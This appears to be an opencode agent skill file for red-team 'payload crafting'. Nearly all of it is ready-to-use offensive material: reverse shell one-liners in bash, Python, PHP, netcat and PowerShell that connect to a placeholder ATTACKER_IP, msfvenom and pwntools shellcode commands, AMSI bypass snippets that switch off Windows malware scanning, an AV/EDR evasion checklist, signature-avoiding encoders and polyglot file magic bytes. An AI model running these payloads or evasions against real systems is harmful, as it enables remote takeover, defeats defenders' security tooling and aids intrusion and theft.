---
name: payload-crafting
description: Payload generation patterns and evasion techniques
license: MIT
compatibility: opencode
metadata:
  audience: red-team
  workflow: payload-dev
---

## Payload Crafting Reference

### Reverse Shells (Linux)

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
# exec variant
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat traditional
nc -e /bin/sh ATTACKER_IP PORT
# Netcat OpenBSD
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
```

### Reverse Shells (Windows)

```powershell
# PowerShell basic
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"

# PowerShell base64 encoded
# powershell -e [base64]
```

### Shellcode Quick Reference

```
# msfvenom
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f py -b '\x00'
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f c -b '\x00\x0a\x0d'
msfvenom -p linux/x64/exec CMD="/bin/sh" -f py

# pwntools shellcraft
from pwn import *
shellcode = asm(shellcraft.amd64.linux.sh())
shellcode = asm(shellcraft.amd64.linux.connect('IP', PORT))
```

### AMSI Bypass (PowerShell)

```powershell
# Memory patching
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Reflection
$w = 'System.Management.Automation.A'; $v = 'Utils'; $u = 'amsiInitFailed'
$r = [Ref].Assembly.GetType(($w+$v)); $r.GetField($u,'NonPublic,Static').SetValue($null,$true)

# Obfuscated ref
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$p=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$p,1)
```

### AV/EDR Evasion Checklist
- [ ] No suspicious API calls (VirtualAlloc, CreateRemoteThread, WriteProcessMemory)
- [ ] Use syscalls directly instead of ntdll.dll wrappers
- [ ] Encrypt/encode shellcode (XOR, AES, RC4)
- [ ] Sleep before execution (evade sandbox timeouts)
- [ ] Check for debugging/sandbox artifacts before detonating
- [ ] Unhook ntdll.dll before making syscalls
- [ ] Use indirect syscalls to bypass EDR hooks
- [ ] Stageless over staged to reduce network signatures
- [ ] Custom protocol over standard C2 profiles
- [ ] Process injection via less-monitored APIs (QueueUserAPC, SetThreadContext)
- [ ] PPID spoofing for spawned processes
- [ ] DLL sideloading from legitimate signed applications

### Common Encoders
| Encoder | Description |
|---------|-------------|
| XOR | Simple key XOR, detect via entropy |
| ROT | Add/Sub/ROL/ROR byte shifting |
| AES | Strong but adds import dependency |
| RC4 | Lightweight stream cipher |
| Shikata Ga Nai | Polymorphic XOR additive feedback (metasploit) |
| Zutto Dekiru | Advanced polymorphic (metasploit) |
| Custom | Write your own to avoid signatures |

### File Type Magic for Polyglots
```
PNG:  89 50 4E 47 0D 0A 1A 0A
JPEG: FF D8 FF E0 / FF D8 FF E1 / FF D8 FF FE
GIF:  47 49 46 38 (GIF8)
PDF:  25 50 44 46 (%PDF)
ZIP:  50 4B 03 04 (PK)
PE:   4D 5A (MZ)
ELF:  7F 45 4C 46 (␡ELF)
```
